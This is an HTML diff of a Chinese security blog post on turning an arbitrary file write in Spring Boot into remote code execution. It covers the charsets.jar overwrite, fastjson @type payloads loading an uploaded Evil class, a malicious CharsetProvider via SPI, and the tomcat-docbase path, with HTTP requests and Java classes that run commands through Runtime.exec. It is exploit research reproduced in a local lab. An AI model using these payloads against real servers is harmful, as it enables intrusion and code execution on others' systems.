@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="spring原生场景（charsets.jar）现在生产环境部署 spring boot 项目一般都是将其打包成一个 FatJar，即把所有依赖的第三方 jar 也打包进自身的 app.jar 中，最后以 java -jar app.jar 形式来运行整个项目。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Springboot下写文件RCE">
+<meta property="og:url" content="http://example.com/2024/11/25/Springboot%E4%B8%8B%E5%86%99%E6%96%87%E4%BB%B6RCE/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="spring原生场景（charsets.jar）现在生产环境部署 spring boot 项目一般都是将其打包成一个 FatJar，即把所有依赖的第三方 jar 也打包进自身的 app.jar 中，最后以 java -jar app.jar 形式来运行整个项目。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20241121142052105.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20241121142228655.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20241121143629324.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20241121143713265.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20241121143945546.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20241121144031673.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20241121194340363-17321894227901.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20241121194411512.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20241121194455144.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20241121194522353.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20241124125749757.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20241121174709696.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20241124142943452.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20241124151009210.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20241124151116594.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20241124182944837.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20241124183002070.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20241124183018065.png">
+<meta property="article:published_time" content="2024-11-25T03:09:17.000Z">
+<meta property="article:modified_time" content="2025-05-25T03:23:01.913Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ilikeoyt.github.io/image/image-20241121142052105.png">
+
+<link rel="canonical" href="http://example.com/2024/11/25/Springboot%E4%B8%8B%E5%86%99%E6%96%87%E4%BB%B6RCE/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Springboot下写文件RCE | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/25/Springboot%E4%B8%8B%E5%86%99%E6%96%87%E4%BB%B6RCE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Springboot下写文件RCE
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-11-25 11:09:17" itemprop="dateCreated datePublished" datetime="2024-11-25T11:09:17+08:00">2024-11-25</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-05-25 11:23:01" itemprop="dateModified" datetime="2025-05-25T11:23:01+08:00">2025-05-25</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="spring原生场景（charsets-jar）"><a href="#spring原生场景（charsets-jar）" class="headerlink" title="spring原生场景（charsets.jar）"></a>spring原生场景（charsets.jar）</h2><p>现在生产环境部署 <code>spring boot</code> 项目一般都是将其打包成一个 <code>FatJar</code>，即把所有依赖的第三方 jar 也打包进自身的 <code>app.jar</code> 中，最后以 <code>java -jar app.jar</code> 形式来运行整个项目。</p>
+<span id="more"></span>
+
+<p>运行时项目的 <code>classpath</code> 包括 <code>app.jar</code> 中的 <code>BOOT-INF/classes</code> 目录和 <code>BOOT-INF/lib</code> 目录下的所有 jar，因此无法在其运行的时候往 classpath 中增加文件。</p>
+<p>所以提出了这样一个解决办法：通过往系统classpath（JAVA_HOME&#x2F;jre&#x2F;lib&#x2F;）添加一个jar文件（该jar文件不会在启动时被调用，而是执行某些特定操作才会被调用），执行特定操作，初始化jar文件，造成RCE。</p>
+<p>LandGrey师傅找到了这样一个jar文件：&#x2F;jre&#x2F;lib&#x2F;charsets.jar，如果程序代码中没有Charset.forName(“GBK”);类似的操作，那么该jar文件就不会被调用。</p>
+<p>环境参考：<a target="_blank" rel="noopener" href="https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks?tab=readme-ov-file">https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks?tab=readme-ov-file</a></p>
+<p>在springweb中，有这样一个方法：org.springframework.web.accept.HeaderContentNegotiationStrategy#resolveMediaTypes</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20241121142052105.png" alt="image-20241121142052105"></p>
+<p>获取Accept头部，并通过MediaType.parseMediaTypes调用</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20241121142228655.png" alt="image-20241121142228655"></p>
+<p>随后会来到MimeTypeUtils#parseMimeTypeInternal方法</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20241121143629324.png" alt="image-20241121143629324"></p>
+<p>简单来说，该方法就是对传入的字符串进行一个键值的解析，然后传入MimeType中</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20241121143713265.png" alt="image-20241121143713265"></p>
+<p><img src="https://ilikeoyt.github.io/image/image-20241121143945546.png" alt="image-20241121143945546"></p>
+<p>调用checkParameters方法</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20241121144031673.png" alt="image-20241121144031673"></p>
+<p>触发Charset.forName(value);</p>
+<p>利用方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: localhost:18081</span><br><span class="line">Accept: text/html;charset=GBK</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ilikeoyt.github.io/image/image-20241121194340363-17321894227901.png" alt="image-20241121194340363"></p>
+<p><img src="https://ilikeoyt.github.io/image/image-20241121194411512.png" alt="image-20241121194411512"></p>
+<p>缺点如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1，需root权限。不过好在现在docker/k8s横行，springboot服务大多数都是root权限。</span><br><span class="line">2，charsets.jar加载仅一次机会。如果之前有用户使用过charset=GBK之类的加载过charsets.jar，不管是正常还是恶意的，该方法都会失效。如果该方式已经失效的情况下，你写的charsets.jar又不完整，还可能会导致服务挂掉。</span><br><span class="line">3，完整的charsets.jar比较大，不过测试时不需要完整charsets.jar。</span><br><span class="line">4，jdk目录需要猜测，需要字典。</span><br><span class="line">5，仅jdk8或者以下适用。jdk9开始使用了模块化，不再存在charsets.jar</span><br></pre></td></tr></table></figure>
+
+<h2 id="fastjson场景（charset-class）"><a href="#fastjson场景（charset-class）" class="headerlink" title="fastjson场景（charset&amp;class）"></a>fastjson场景（charset&amp;class）</h2><h4 id="charset"><a href="#charset" class="headerlink" title="charset"></a>charset</h4><p>高版本中，java.nio.charset.Charset这个类在白名单中，所以可以使用如下payload进行RCE</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /fastjson HTTP/1.1</span><br><span class="line">Host: localhost:18081</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 74</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.nio.charset.Charset&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;500&quot;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ilikeoyt.github.io/image/image-20241121194455144.png" alt="image-20241121194455144"></p>
+<p><img src="https://ilikeoyt.github.io/image/image-20241121194522353.png" alt="image-20241121194522353"></p>
+<h4 id="classes"><a href="#classes" class="headerlink" title="classes"></a>classes</h4><p>也可以通过上传class文件，然后通过期望类的方法RCE（[<a target="_blank" rel="noopener" href="https://threedr3am.github.io/2021/04/13/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84Fastjson%20RCE/%EF%BC%89]">https://threedr3am.github.io/2021/04/13/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84Fastjson%20RCE/）]</a>(<a target="_blank" rel="noopener" href="https://threedr3am.github.io/2021/04/13/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84Fastjson">https://threedr3am.github.io/2021/04/13/JDK8任意文件写场景下的Fastjson</a> RCE&#x2F;）)</p>
+<p>Evil.class</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @author threedr3am</span><br><span class="line"> */</span><br><span class="line">public class Evil implements AutoCloseable &#123;</span><br><span class="line"></span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void close() throws Exception &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上传至JAVA_HOME&#x2F;jre&#x2F;classes目录（如果不存在就创建一个），然后发送payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">    &quot;@type&quot;:&quot;Evil&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>mac上复现：</p>
+<p>将fastjson版本切换为1.2.68</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20241124125749757.png" alt="image-20241124125749757"></p>
+<p>但是这种方法只能使用一次，第二次失效，只能重启</p>
+<p>原理：</p>
+<p>由于双亲委派的机制，类的加载顺序会先从Bootstrap ClassLoader（sun.boot.class.path）的加载路径中尝试加载，当找不到该类时，才会选择从下一级的ExtClassLoader（java.ext.dirs）的加载路径寻找，以此类推到引发加载的类所在的类加载器为止。</p>
+<p>我们可以通过代码查看一下Bootstrap ClassLoader的加载路径：</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20241121174709696.png" alt="image-20241121174709696"></p>
+<p>这里是D:\jdk_8u161\classes，那么我们在尝试加载Evil类的时候，首先就会去D:\jdk_8u161\classes查找有没有这个类，有的话直接加载，没有再继续向下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">优点如下</span><br><span class="line">1，多次机会写入，Evil写坏了就写Evil2/Evil3</span><br><span class="line">2，写入文件不大。</span><br><span class="line">缺点如下</span><br><span class="line">1，需root权限。</span><br><span class="line">2，jdk目录需要猜测。</span><br><span class="line">3，仅jdk8或者以下适用，jdk9的ClassLoader变动，不再尝试载入该文件夹。</span><br><span class="line">4，默认不存在classes目录，需要创建</span><br><span class="line">5，需触发入口，不像charsets.jar那样可以header触发。</span><br></pre></td></tr></table></figure>
+
+<h2 id="classes-SPI"><a href="#classes-SPI" class="headerlink" title="classes+SPI"></a>classes+SPI</h2><h4 id="Charset-forName原理"><a href="#Charset-forName原理" class="headerlink" title="Charset.forName原理"></a>Charset.forName原理</h4><p>源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">public static Charset forName(String charsetName) &#123;</span><br><span class="line">    Charset cs = lookup(charsetName);</span><br><span class="line">    if (cs != null)</span><br><span class="line">        return cs;</span><br><span class="line">    throw new UnsupportedCharsetException(charsetName);</span><br><span class="line">&#125;</span><br><span class="line">private static Charset lookup(String charsetName) &#123;</span><br><span class="line">    if (charsetName == null)</span><br><span class="line">        throw new IllegalArgumentException(&quot;Null charset name&quot;);</span><br><span class="line">    Object[] a;</span><br><span class="line">    if ((a = cache1) != null &amp;&amp; charsetName.equals(a[0]))</span><br><span class="line">        return (Charset)a[1];</span><br><span class="line">    // We expect most programs to use one Charset repeatedly.</span><br><span class="line">    // We convey a hint to this effect to the VM by putting the</span><br><span class="line">    // level 1 cache miss code in a separate method.</span><br><span class="line">    return lookup2(charsetName);</span><br><span class="line">&#125;</span><br><span class="line">private static Charset lookup2(String charsetName) &#123;</span><br><span class="line">    Object[] a;</span><br><span class="line">    if ((a = cache2) != null &amp;&amp; charsetName.equals(a[0])) &#123;</span><br><span class="line">        cache2 = cache1;</span><br><span class="line">        cache1 = a;</span><br><span class="line">        return (Charset)a[1];</span><br><span class="line">    &#125;</span><br><span class="line">    Charset cs;</span><br><span class="line">    if ((cs = standardProvider.charsetForName(charsetName)) != null ||</span><br><span class="line">        (cs = lookupExtendedCharset(charsetName))           != null ||</span><br><span class="line">        (cs = lookupViaProviders(charsetName))              != null)</span><br><span class="line">    &#123;</span><br><span class="line">        cache(charsetName, cs);</span><br><span class="line">        return cs;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /* Only need to check the name if we didn&#x27;t find a charset for it */</span><br><span class="line">    checkName(charsetName);</span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后在lookup2方法处，有三个加载charsetName的调用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">standardProvider.charsetForName(charsetName)</span><br><span class="line">lookupExtendedCharset(charsetName)</span><br><span class="line">lookupViaProviders(charsetName)</span><br></pre></td></tr></table></figure>
+
+<p>前两种方式都是内置的provider模式，无价值，看一下lookupViaProviders方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">return AccessController.doPrivileged(</span><br><span class="line">                new PrivilegedAction&lt;Charset&gt;() &#123;</span><br><span class="line">                    public Charset run() &#123;</span><br><span class="line">                        for (Iterator&lt;CharsetProvider&gt; i = providers();</span><br><span class="line">                             i.hasNext();) &#123;</span><br><span class="line">                            CharsetProvider cp = i.next();</span><br><span class="line">                            Charset cs = cp.charsetForName(charsetName);</span><br><span class="line">                            if (cs != null)</span><br><span class="line">                                return cs;</span><br><span class="line">                        &#125;</span><br><span class="line">                        return null;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br></pre></td></tr></table></figure>
+
+<p>这里会将providers()方法的返回结果赋值给<code>Iterator&lt;CharsetProvider&gt; i</code>，而providers方法就是一个SPI的调用</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20241124142943452.png" alt="image-20241124142943452"></p>
+<p>那我们就可以创建一个META-INF，里面存在一个含恶意provider的文件即可</p>
+<p>Evil.class</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line">import java.nio.charset.Charset;</span><br><span class="line">import java.util.HashSet;</span><br><span class="line">import java.util.Iterator;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @author threedr3am</span><br><span class="line"> */</span><br><span class="line">public class Evil extends java.nio.charset.spi.CharsetProvider &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Iterator&lt;Charset&gt; charsets() &#123;</span><br><span class="line">        return new HashSet&lt;Charset&gt;().iterator();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Charset charsetForName(String charsetName) &#123;</span><br><span class="line">        //因为Charset会被缓存，导致同样的charsetName只能执行一次，所以，我们可以利用前缀触发，后面的内容不断变化就行了，甚至可以把命令通过charsetName传入</span><br><span class="line">        if (charsetName.startsWith(&quot;Evil&quot;)) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);</span><br><span class="line">            &#125; catch (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return Charset.forName(&quot;UTF-8&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ilikeoyt.github.io/image/image-20241124151009210.png" alt="image-20241124151009210"></p>
+<p><img src="https://ilikeoyt.github.io/image/image-20241124151116594.png" alt="image-20241124151116594"></p>
+<h2 id="tomcat-docbase"><a href="#tomcat-docbase" class="headerlink" title="tomcat-docbase"></a>tomcat-docbase</h2><p>springboot会在&#x2F;tmp目录生成tomcat-docbase文件夹，本质相当于tomcat的根目录，因此加载类时还会尝试加载&#x2F;tmp&#x2F;tomcat-docbase.8080.xx&#x2F;WEB-INF&#x2F;classes&#x2F;目录下的类。</p>
+<p>还是和classes的方法一致，将Evil.class放到&#x2F;tmp&#x2F;tomcat-docbase.8080.xx&#x2F;WEB-INF&#x2F;classes&#x2F;下，然后运行相同的payload即可</p>
+<p>复现过程：</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20241124182944837.png" alt="image-20241124182944837"></p>
+<p><img src="https://ilikeoyt.github.io/image/image-20241124183002070.png" alt="image-20241124183002070"></p>
+<p><img src="https://ilikeoyt.github.io/image/image-20241124183018065.png" alt="image-20241124183018065"></p>
+<p>Evil.class</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">//</span><br><span class="line">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="line">// (powered by FernFlower decompiler)</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Evil extends Exception &#123;</span><br><span class="line">    public Evil() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;touch /tmp/ycx&quot;);</span><br><span class="line">        &#125; catch (IOException var1) &#123;</span><br><span class="line">            throw new RuntimeException(var1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">1，无需root权限</span><br><span class="line">2，不限于jdk8，jdk11下测试成功</span><br><span class="line">缺点如下</span><br><span class="line">1，tomcat-docbase带随机后缀，无法爆破，只能配合目录读取</span><br><span class="line">2，WEB-INF/classes目录需要创建</span><br><span class="line">3，触发时直接Class.forName(clazz)是不行的，必须要特定classloader，比如Thread.currentThread().getContextClassLoader()。</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://ilikeoyt.github.io/2024/09/10/Apache-OfBiz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2023-49070%EF%BC%89/"> Apache OfBiz 反序列化命令执行漏洞（CVE-2023-49070）</a></p>
+<p><a target="_blank" rel="noopener" href="https://ilikeoyt.github.io/2024/12/18/s2-066%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/">s2-066分析与复现 </a></p>
+<p>© 2024 ycxlo</p>
+<p>Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> &amp; <a target="_blank" rel="noopener" href="https://muse.theme-next.org/">NexT.Muse</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/09/10/Apache-OfBiz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2023-49070%EF%BC%89/" rel="prev" title="Apache OfBiz 反序列化命令执行漏洞（CVE-2023-49070）">
+      <i class="fa fa-chevron-left"></i> Apache OfBiz 反序列化命令执行漏洞（CVE-2023-49070）
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2024/12/18/s2-066%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/" rel="next" title="s2-066分析与复现">
+      s2-066分析与复现 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
